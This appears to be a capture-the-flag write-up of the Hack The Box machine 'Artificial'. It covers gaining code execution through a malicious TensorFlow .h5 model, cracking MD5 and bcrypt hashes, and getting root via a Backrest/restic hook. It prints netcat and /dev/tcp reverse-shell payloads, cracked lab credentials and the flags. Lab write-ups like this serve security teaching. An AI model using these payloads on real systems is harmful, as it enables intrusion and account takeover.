# ARTIFICIAL

## PORT SCAN

***

| PORT | SERVICE |
| ---- | ------- |
| 22   | SSH     |
| 80   | HTTP    |

## RECONNAISSANCE

***

We need to add `artifical.htb` to `/etc/hosts`:

```bash
echo '10.10.11.75 artificial.htb' | sudo tee -a /etc/hosts
```

![](gitbook/cybersecurity/images/Pasted%20image%2020250627150218.png)

If we check the source code, we can notice this:

![](gitbook/cybersecurity/images/Pasted%20image%2020250627150300.png)

This seems to be a web application that uses TensorFlow, TensorFlow is an open-source machine learning framework developed by Google. It's widely used for building and training deep learning models, especially in tasks like image recognition, natural language processing, and predictive analytics.

Let's save that info for now, since we can register on the site, it's a nice approach to create a test account to check for functionalities:

![](gitbook/cybersecurity/images/Pasted%20image%2020250627150635.png)

![](gitbook/cybersecurity/images/Pasted%20image%2020250627150701.png)

As seen, we can upload files, if we check the requirements and the dockerfile we can download, we can check this:

```python
cat requirements.txt && cat Dockerfile

tensorflow-cpu==2.13.1

FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

We can find that this uses `tensorflow-cpu 2.13.1`, if we search for rce regarding TensorFlow, we can check this:

BLOG: https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model

Let's begin exploitation to reproduce the steps.

## EXPLOITATION

***

Based on the article, we can do this:

![](gitbook/cybersecurity/images/Pasted%20image%2020250627151445.png)

So, we need to create a `.h5` file with the following script in order to import the os library to achieve the RCE:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc IP 6666 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

In order for the script to work, we need to build the image, we got the requirements and the dockerfile so we can do this on the same directory:

If you don't have docker installed on kali, you can do:

```bash
sudo apt update
sudo apt install -y docker.io
sudo systemctl enable --now docker
```

Once it downloads, we can execute the exploit with:

```python
docker run -it --rm -v "$PWD":/app -w /app tensorflow/tensorflow:2.13.0 python3 exploit.py
```

Now, we will get our `exploit.h5` file which we can upload on the dashboard:

![](gitbook/cybersecurity/images/Pasted%20image%2020250627154846.png)

![](gitbook/cybersecurity/images/Pasted%20image%2020250627154904.png)

We need to click on `View Predictions` and set up our listener before we do it, then, we will receive our shell:

![](gitbook/cybersecurity/images/Pasted%20image%2020250628144655.png) There we go, let's begin privilege escalation.

## PRIVILEGE ESCALATION

***

First of all, let's stabilize our shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![](gitbook/cybersecurity/images/Pasted%20image%2020250628145158.png)

We can use linpeas to check any PE path we may have:

![](gitbook/cybersecurity/images/Pasted%20image%2020250628145911.png)

We can see a `users.db` file inside of here, if we check it on `sqlitebrowser`, we can see this:

![](gitbook/cybersecurity/images/Pasted%20image%2020250628145943.png)

We got some users with hashes, let's get them and attempt to crack them:

```
c99175974b6e192936d97224638a34f8
0f3d8c76530022670f1c6029eed09ccb
b606c5f5136170f15444251656538b36
bc25b1f80f544c0ab451c02a3dca9fc6
bf041041e57f1aff3be7ea1abd6129d0
```

We can crack them with `john` or `crackstation`:

```
john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
mattp005numbertwo (?)
marwinnarak043414036 (?)
```

The hashes found credentials for `gael` and `royer`, only `gaek` works on ssh:

```
gael:mattp005numbertwo
```

![](gitbook/cybersecurity/images/Pasted%20image%2020250628150408.png) Let's run linpeas again:

![](gitbook/cybersecurity/images/Pasted%20image%2020250628150546.png)

Port `9898` seems weird, let's perform `ssh tunneling` to check the contents of it:

```
ssh -L 9898:127.0.0.1:9898 gael@artificial.htb
```

![](gitbook/cybersecurity/images/Pasted%20image%2020250628150721.png)

We need some creds for it, if we check our linpeas scan, we can find this:

![](gitbook/cybersecurity/images/Pasted%20image%2020250628151017.png)

We got a `backrest_backup` file, let's get it and check the contents:

```json
tar -xvf backrest_backup.tar.gz
backrest/
backrest/restic
backrest/oplog.sqlite-wal
backrest/oplog.sqlite-shm
backrest/.config/
backrest/.config/backrest/
backrest/.config/backrest/config.json
backrest/oplog.sqlite.lock
backrest/backrest
backrest/tasklogs/
backrest/tasklogs/logs.sqlite-shm
backrest/tasklogs/.inprogress/
backrest/tasklogs/logs.sqlite-wal
backrest/tasklogs/logs.sqlite
backrest/oplog.sqlite
backrest/jwt-secret
backrest/processlogs/
backrest/processlogs/backrest.log
backrest/install.sh

cat backrest/.config/backrest/config.json | jq
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

We got a `bcrypt` password but it's initially encoded on base64, we need to use hashcat to crack it:

```bash
echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d > hash.txt

hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^
```

Nice, we got credentials for the web page:

```
backrest_root:!@#$%^
```

![](gitbook/cybersecurity/images/Pasted%20image%2020250628151732.png)

As seen, we can make repositories:

![](gitbook/cybersecurity/images/Pasted%20image%2020250628152029.png)

This manages something called `restic`, we can go with two `privilege escalation paths` on here, first, we can exploit the `restic` privesc shown on `gtfobins`:

GTFOBINS: https://gtfobins.github.io/gtfobins/restic/

Or we can speed up the process by creating a malicious hook that will get us a shell as root, as seen on the image, we can create hooks which will execute as commands:

![](gitbook/cybersecurity/images/Pasted%20image%2020250628152257.png)

Let's create a base repository which will include the following hook and `ENV Var`;

Env vars should be:

```
RESTIC_PASSWORD_COMMAND=bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'
```

And the hook, should be this:

```
# First we need to base64 this command:

echo "bash -i >& /dev/tcp/10.10.14.180/4444 0>&1" | base64

# Save the base64 string and do:

RESTIC_PASSWORD_COMMAND=echo '<base64>' | base64 -d | bash
```

The repo should look like this:

![](gitbook/cybersecurity/images/Pasted%20image%2020250628152715.png)

Now, set up our listener and submit the repo:

![](gitbook/cybersecurity/images/Pasted%20image%2020250628152747.png)

Once we submit it, we get our root shell, let's get both flags:

```bash
root@artificial:/# cat /home/gael/user.txt
d2553780a8992c74c99cc2fb54f9670a

root@artificial:/# cat /root/root.txt
841c116f4c7b582a36448e761a8aa541
```

![](gitbook/cybersecurity/images/Pasted%20image%2020250628152903.png)

https://labs.hackthebox.com/achievement/machine/1872557/668
